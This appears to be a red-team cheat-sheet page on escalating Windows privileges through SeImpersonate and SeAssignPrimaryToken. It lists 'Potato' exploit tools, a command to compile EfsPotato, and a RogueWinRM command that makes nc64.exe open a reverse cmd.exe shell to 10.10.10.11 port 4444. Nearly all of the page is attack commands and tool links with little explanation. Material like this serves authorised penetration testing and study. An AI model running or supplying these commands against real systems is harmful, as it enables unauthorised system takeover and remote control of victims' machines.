---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/privilege-escalation/windows/seimpersonate-seassignprimarytoken
---

# SeImpersonate / SeAssignPrimaryToken

These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.

```powershell
C:>/ whoami /priv

Privilege Name                Description                               State   
============================= ========================================= ========
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
```

{% embed url="https://github.com/zcgonvh/EfsPotato.git" %}

{% code overflow="wrap" %}
```bash
C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe EfsPotato.cs -nowarn:1691,618
```
{% endcode %}

{% embed url="https://github.com/antonioCoco/RogueWinRM" %}

```powershell
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe 10.10.10.11 4444"
```

{% embed url="https://github.com/lypd0/DeadPotato.git" %}

{% embed url="https://github.com/BeichenDream/GodPotato.git" %}
